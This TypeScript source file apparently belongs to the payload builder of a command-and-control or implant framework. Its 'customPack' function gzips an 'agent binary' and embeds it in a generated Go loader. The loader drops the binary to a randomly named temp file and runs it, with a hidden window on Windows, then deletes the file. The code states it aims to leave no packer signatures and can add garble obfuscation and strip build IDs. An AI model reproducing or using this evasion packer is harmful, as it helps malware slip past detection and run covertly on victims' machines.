import * as fs from "fs";
import * as path from "path";
import * as zlib from "zlib";
import { $ } from "bun";

/**
 * Custom packer: compresses the agent binary with gzip and wraps it in a
 * minimal Go loader that decompresses to a temp file and executes it.
 * Produces a binary with no UPX/packer signatures.
 */
export async function customPack(
  inputPath: string,
  outputPath: string,
  goos: string,
  goarch: string,
  obfuscate: boolean,
  sendToStream: (data: any) => void,
): Promise<boolean> {
  const originalData = fs.readFileSync(inputPath);
  const originalSize = originalData.length;

  const compressed = zlib.gzipSync(originalData, { level: 9 });
  const compressedSize = compressed.length;
  const ratio = ((1 - compressedSize / originalSize) * 100).toFixed(1);

  sendToStream({
    type: "output",
    text: `Custom packer: ${originalSize} → ${compressedSize} bytes (${ratio}% reduction)\n`,
    level: "info",
  });

  const workDir = path.join(path.dirname(inputPath), "_packer_tmp");
  fs.mkdirSync(workDir, { recursive: true });

  try {
    fs.writeFileSync(path.join(workDir, "payload.gz"), compressed);

    const ext = goos === "windows" ? ".exe" : "";
    const loaderSrc = generateLoaderSource(goos);
    fs.writeFileSync(path.join(workDir, "main.go"), loaderSrc);

    const goModContent = `module packer-loader\n\ngo 1.21\n`;
    fs.writeFileSync(path.join(workDir, "go.mod"), goModContent);

    const env: Record<string, string> = {
      GOOS: goos,
      GOARCH: goarch,
      CGO_ENABLED: "0",
    };

    const ldflags = "-s -w -buildid=";
    const outFile = path.join(workDir, `loader${ext}`);

    let buildCmd;
    if (obfuscate) {
      buildCmd = $`garble -literals -tiny build -trimpath -buildvcs=false -ldflags=${ldflags} -o ${outFile} .`;
    } else {
      buildCmd = $`go build -trimpath -buildvcs=false -ldflags=${ldflags} -o ${outFile} .`;
    }

    const result = await buildCmd.env(env).cwd(workDir).nothrow().quiet();
    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      sendToStream({
        type: "output",
        text: `Custom packer: loader build failed: ${stderr}\n`,
        level: "error",
      });
      return false;
    }

    fs.copyFileSync(outFile, outputPath);

    const finalSize = fs.statSync(outputPath).size;
    sendToStream({
      type: "output",
      text: `Custom packer: final binary ${finalSize} bytes\n`,
      level: "success",
    });

    return true;
  } finally {
    fs.rmSync(workDir, { recursive: true, force: true });
  }
}

function generateLoaderSource(goos: string): string {
  if (goos === "windows") {
    return `package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

//go:embed payload.gz
var payload []byte

func main() {
	gr, err := gzip.NewReader(bytes.NewReader(payload))
	if err != nil {
		os.Exit(1)
	}
	data, err := io.ReadAll(gr)
	gr.Close()
	if err != nil {
		os.Exit(1)
	}

	rnd := make([]byte, 8)
	rand.Read(rnd)
	name := hex.EncodeToString(rnd) + ".exe"
	tmp := filepath.Join(os.TempDir(), name)

	if err := os.WriteFile(tmp, data, 0o700); err != nil {
		os.Exit(1)
	}

	cmd := exec.Command(tmp)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
	os.Remove(tmp)
}
`;
  }

  return `package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

//go:embed payload.gz
var payload []byte

func main() {
	gr, err := gzip.NewReader(bytes.NewReader(payload))
	if err != nil {
		os.Exit(1)
	}
	data, err := io.ReadAll(gr)
	gr.Close()
	if err != nil {
		os.Exit(1)
	}

	rnd := make([]byte, 8)
	rand.Read(rnd)
	name := hex.EncodeToString(rnd)
	tmp := filepath.Join(os.TempDir(), name)

	if err := os.WriteFile(tmp, data, 0o700); err != nil {
		os.Exit(1)
	}
	defer os.Remove(tmp)

	cmd := exec.Command(tmp)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
`;
}
